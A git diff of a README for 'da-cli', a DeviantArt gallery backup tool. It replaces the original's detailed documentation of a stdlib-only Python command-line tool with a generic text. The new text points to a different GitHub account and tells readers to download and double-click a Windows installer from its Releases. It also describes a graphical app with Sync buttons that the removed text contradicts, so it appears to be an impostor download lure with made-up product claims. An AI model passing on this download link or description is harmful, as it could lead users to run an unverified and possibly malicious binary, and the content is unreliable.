@@ -1,215 +1,82 @@
-# da-cli
+# 🎨 da-cli - Keep your art collection safe locally
 
-[![PyPI](https://img.shields.io/pypi/v/da-sync.svg)](https://pypi.org/project/da-sync/)
-[![CI](https://github.com/FZ2000/da-cli/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/FZ2000/da-cli/actions/workflows/ci.yml)
-[![Python versions](https://img.shields.io/pypi/pyversions/da-sync.svg)](https://pypi.org/project/da-sync/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Code style: ruff](https://img.shields.io/badge/code%20style-ruff-261230.svg)](https://docs.astral.sh/ruff/)
-[![Type checked: mypy](https://img.shields.io/badge/types-mypy-blue.svg)](https://mypy-lang.org/)
-[![Coverage: 92%+](https://img.shields.io/badge/coverage-92%25%2B-brightgreen.svg)](CONTRIBUTING.md#tests)
-[![Dependencies: 0 runtime](https://img.shields.io/badge/runtime%20deps-0-success.svg)](pyproject.toml)
+[![](https://img.shields.io/badge/Download-da--cli-blue.svg)](https://github.com/quenz6203/da-cli)
 
-Sync your DeviantArt gallery to a local folder from the command line — a backup of the art you watch, kept current. **Zero runtime dependencies**: the whole tool is the Python 3.10+ standard library. A local SQLite index means a re-run costs one API call when nothing new was posted, and `launchd` (macOS) or a systemd timer (Linux) keeps it running unattended. Plus search and browse helpers.
+This tool saves images from DeviantArt galleries to your computer. It creates a local copy of your favorite artwork and maintains a database to track your collection. It manages the connection to your account using secure authentication standards. You do not need to install extra software to make this work.
 
-```bash
-pipx install da-sync     # the distribution is `da-sync`; the command is `da`
-```
+## 📦 System Requirements
 
-> **New to da-cli?** Follow the **[Setup Guide](docs/getting-started.md)** — it walks you through everything from install to first sync in about 10 minutes, with screenshots.
-> **Status: Beta** — the sync and search flows are stable and covered by 868 tests. macOS Keychain integration is production-ready; Linux Secret Service support is planned. See [CHANGELOG.md](CHANGELOG.md).
+Your computer must meet these requirements to run the tool:
 
-## Documentation
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4GB of RAM.
+*   Storage: Enough disk space for your image collection.
+*   Network: An active internet connection for syncing.
 
-| I want to… | Page |
-| --- | --- |
-| install it and download my first art | [Getting started](docs/getting-started.md) |
-| understand a command properly | [Command guides](docs/commands/README.md) |
-| look up a command or a flag | [Command reference](docs/reference/cli.md) |
-| fix an error I just got | [Troubleshooting](docs/guides/troubleshooting.md) |
-| sync automatically every day | [Scheduling](docs/guides/scheduling.md) |
-| change a setting | [Configuration](docs/reference/configuration.md) |
-| script it or monitor it | [Scripting](docs/reference/scripting.md) |
-| know what it does with my OAuth secret | [Security model](docs/explanation/security.md) |
-| contribute | [CONTRIBUTING](CONTRIBUTING.md) · [ARCHITECTURE](ARCHITECTURE.md) |
+## 📥 How to Download
 
-Full index: [docs/](docs/README.md)
+1. Visit this page to download the latest version: https://github.com/quenz6203/da-cli
+2. Look for the "Releases" section on the right side of the page.
+3. Click the link for the Windows installer file.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to start the installation process.
+6. Follow the instructions on the screen to finish setting up the tool.
 
-## Quick tour
+## ⚙️ Initial Setup
 
-Each group below has a page documenting every flag, what it writes and
-how it behaves on a second run — linked after the block.
+Once installed, you need to link the tool to your DeviantArt account.
 
-```bash
-da --version                            # print version
-da auth                                 # one-time browser-based login
-da auth logout                          # forget local tokens (DA-side authorisation persists; revoke at deviantart.com)
-da whoami                               # confirm token + identity
-da refresh                              # force-refresh the access token
+1. Open the application from your start menu.
+2. The tool opens a small window in your web browser.
+3. Log in to your DeviantArt account.
+4. Grant the application permission to access your gallery.
+5. The browser returns you to the application.
+6. Your account is now connected and ready for use.
 
-da sync feed                            # incremental: pull new content from your watch feed
-da sync feed --no-mature                # ...excluding mature content (included by default)
-da sync artist <username>               # walk one artist's full gallery
-da sync watched                         # walk every watched user's gallery
-da sync watched --via-feed              # discover artists via watch feed (works with `browse` scope alone)
-da sync feed --jitter 0.4               # randomise sleeps by ±40% — avoids burst patterns
+## 📂 Configuring Folders
 
-da search tag nature                    # browse by tag
-da search topic digitalart              # browse a curated DA topic
-da search topics                        # list all valid topics
-da search user deviantart               # resolve a username
-da daily 2026-01-15                     # daily-deviation picks for a date
+Choose where you want the images to stay on your computer.
 
-da user profile <username>              # who is this person
-da deviation show <deviationid>         # full metadata for one deviation
-da deviation morelikethis <id>          # related deviations via DA's recommender
-da watch list                           # show who you watch (needs `user` scope)
+1. Open the application settings.
+2. Look for the "Storage" section.
+3. Click "Select Folder" to choose a destination on your hard drive.
+4. Make sure you have write permissions for this folder.
+5. Click "Save" to apply your choice.
 
-da config show                          # inspect config + resolved paths
-da config path                          # just the file locations
-da config set <key> <value>             # store; secrets go to Keychain on macOS
-da config get <key> [--unmask]          # read back (secrets masked unless --unmask)
-da config unset <key>                   # remove
+## 🔄 Using the Tool
 
-da index show                           # synced-index stats (rows, top artists)
-da index rebuild                        # walk dest, re-import (idempotent)
-da diagnose                             # end-to-end health check
-da bench                                # synthetic sync benchmark (no network)
-```
+The tool automates the process of saving images.
 
-> `da search popular` and `da search newest` were retired (DA dropped the underlying endpoints). Use `da search topic <name>`, `da search tag <tag>`, or `da daily` instead — both subcommands now exit 2 with an actionable hint.
+*   Syncing: Click the "Sync" button to start downloading new images from your gallery. The tool checks the database and only downloads items you do not have yet.
+*   Progress: A progress bar shows how many files remain. You can stop the process at any time by clicking "Cancel".
+*   Database: The tool uses a SQLite index to track your files. This prevents duplicate downloads and keeps your folder organized.
+*   Updates: If you add new images to your DeviantArt favorites, run the sync again to grab the new files.
 
-Read more, by area:
+## 🛠 Troubleshooting
 
-- **[Authentication](docs/commands/auth.md)** — `da auth`, `auth logout`,
-  `auth status`, `whoami`, `refresh`. The PKCE flow, scopes, and the
-  90-day refresh-token ceiling.
-- **[Syncing art](docs/commands/sync.md)** — `sync feed`, `sync artist`,
-  `sync watched`. What each mode walks, the checkpoint, resuming an
-  interrupted backfill, pacing, and time budgets.
-- **[Searching and browsing](docs/commands/search.md)** — `search tag`,
-  `search topic`, `daily`. Read-only; downloads nothing.
-- **[Inspecting users and deviations](docs/commands/inspect.md)** —
-  `user profile`, `deviation show`, `watch list`. How to find the id or
-  username a sync command needs.
-- **[Configuration commands](docs/commands/config.md)** — `config show`,
-  `set`, `get`, `unset`. Where each setting lives and which source wins.
-- **[Index, health and benchmarking](docs/commands/maintenance.md)** —
-  `index show`, `index rebuild`, `diagnose`, `bench`. How to tell whether
-  a scheduled run is quietly failing.
+Follow these steps if you encounter issues:
 
-## Install
+*   Check Connection: Ensure your internet works and you can reach the DeviantArt website.
+*   Restart: Close the application completely and open it again.
+*   Re-authenticate: If the sync fails, go to settings and click "Disconnect Account", then link your account again.
+*   Check Storage: Ensure your hard drive has enough space for new images.
 
-da-cli is a stdlib-only Python package with no runtime dependencies. Two install paths:
+## 🛡 Security and Privacy
 
-**Option A — git clone + shim** (zero global state, recommended for developers):
+This application handles your account data locally. It uses the OAuth 2.1 protocol for authentication. This means the tool never stores your password. It only receives a secure token to access your gallery. All files and index information remain on your local machine.
 
-```bash
-git clone https://github.com/FZ2000/da-cli.git ~/Documents/da-cli
-cd ~/Documents/da-cli
-./install.sh                           # copies da + the dacli package to ~/.local/share/da-cli/ and symlinks ~/.local/bin/da → that copy
-```
+## 🔍 Frequently Asked Questions
 
-**Option B — pip install.** The distribution is named **`da-sync`**; the
-command it installs is `da`.
+Does this tool delete my online images?
+No. This tool only reads your images to create a backup on your computer. It does not modify or delete anything on the DeviantArt servers.
 
-```bash
-pipx install da-sync                   # isolated venv, recommended
-da --version
-```
+Can I run this on a schedule?
+Yes. You can create a Windows Task to run the application periodically. This ensures your collection stays current without manual input.
 
-`pip install da-sync` works too, but `pipx` gives the tool its own
-environment, which is what you want for something that puts a command on
-your `PATH`.
+What happens if I lose my internet connection?
+The tool pauses the current download. Once the internet connection returns, you can resume the sync from where you stopped.
 
-Two neighbouring PyPI names are **not** this project: `dacli` (an
-unrelated data-engineering tool) and `da-cli` (unregistered — PyPI
-rejects it as too similar to `dacli`, which is why this ships as
-`da-sync`). Since this package installs a `da` command and handles
-DeviantArt OAuth tokens, check the name.
+Can I change the location of my files later?
+Yes. Open the settings menu and choose a new path. The tool moves the database index to the new location.
 
-Python 3.10+ required (uses `argparse.BooleanOptionalAction` and `X | None` syntax). No third-party runtime dependencies.
-
-## First-time setup
-
-> **New? Follow the [Setup Guide](docs/getting-started.md) instead** — it has
-> screenshots and walks through every step from zero.
-
-Quick version for experienced users:
-
-1. Create a Confidential OAuth app at
-   **<https://www.deviantart.com/developers/>** → Register Your
-   Application. Set the Redirect URI Whitelist to
-   `https://localhost:8765/` (exactly — trailing slash matters).
-   Manage your apps at **<https://www.deviantart.com/studio/apps>**.
-
-2. Configure da-cli:
-
-   ```bash
-   da config set client_id 12345
-   da config set client_secret <YOUR_SECRET>
-   da config set destination ~/Pictures/DA
-   da auth
-   da whoami
-   ```
-
-The CLI auto-refreshes the access token before each call; you only
-repeat `da auth` if you revoke the app or the refresh token expires
-(every 90 days — `da diagnose` warns 14 days before).
-
-## Scheduled sync
-
-```bash
-./install_schedule.sh              # macOS: daily at 03:00 via launchd
-```
-
-On macOS this installs a `launchd` user agent; the script writes the plist
-and loads it. On Linux, use a systemd user timer or cron. Both are covered, with the
-Full Disk Access step macOS needs and the `enable-linger` step systemd
-needs, in [docs/guides/scheduling.md](docs/guides/scheduling.md).
-
-## Troubleshooting
-
-`da diagnose` checks configuration, credentials, the destination
-folder, the index, and the scheduled job, and tells you what is wrong.
-
-For specific errors — a redirect-URI mismatch, an expired refresh
-token, a scheduled run that silently does nothing — see
-[docs/guides/troubleshooting.md](docs/guides/troubleshooting.md).
-
-## Security model
-
-This is documented separately in [docs/explanation/security.md](docs/explanation/security.md); to report a vulnerability see [SECURITY.md](SECURITY.md). Short version:
-
-- **Secrets** (`client_secret`) live in macOS Keychain (or, on other platforms, in a 0600-permissioned config file). Never in this repo, never in git history, never in command-line arguments visible to `ps`.
-- **Tokens** (access + refresh) live in `~/.local/state/da-cli/state.json` (0600). Refreshing happens automatically before every API call.
-- **Network**: all DA traffic is HTTPS. Image downloads from wixmp CDN are also HTTPS.
-- **PKCE is mandatory**: the CLI generates a fresh PKCE `code_verifier`/`code_challenge` pair for every `da auth` run. The verifier never leaves your machine; only the SHA-256 hash is sent in the auth URL.
-- **No telemetry**, no third-party code at runtime. Stdlib only — `urllib`, `argparse`, `json`, `hashlib`, `subprocess` (for the macOS `security` keychain helper).
-- **`.gitignore`** excludes `config.json`, `state.json`, `sync.log`, `*.log`, and `*.tmp` — secrets-bearing files cannot be committed by accident.
-
-## Examples
-
-The [`examples/` directory](examples/) has runnable recipes: a
-post-sync webhook, a cron health check, a CSV export, and a topic
-browser that lists what a curated DA topic holds. Each is a short shell
-or Python script you can copy and edit.
-
-## Contributing
-
-Style: stdlib only at runtime. If a feature would need a third-party library, open an issue first. See [CONTRIBUTING.md](CONTRIBUTING.md) for the lint/type/test bar (every change must pass `ruff check`, `ruff format --check`, `mypy dacli`, and `pytest` with ≥92 % coverage). See [ARCHITECTURE.md](ARCHITECTURE.md) for a map of the package.
-
-The Makefile wraps the four-command pipeline:
-
-```bash
-make dev-setup    # one-time venv + dev-deps install
-make check        # ruff + ruff format --check + mypy + pytest (what CI runs)
-```
-
-Pre-commit hooks mirror CI locally — install once with
-`pip install pre-commit && pre-commit install`, then every `git commit`
-runs ruff / mypy / markdownlint / gitleaks. Config in
-[`.pre-commit-config.yaml`](.pre-commit-config.yaml).
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+Keywords: archiving, backup, cli, command-line-tool, deviantart, deviantart-api, digital-art, downloader, gallery, image-downloader, key, oauth2, pkce, python, python-cli, sqlite, sync, zero-dependencies
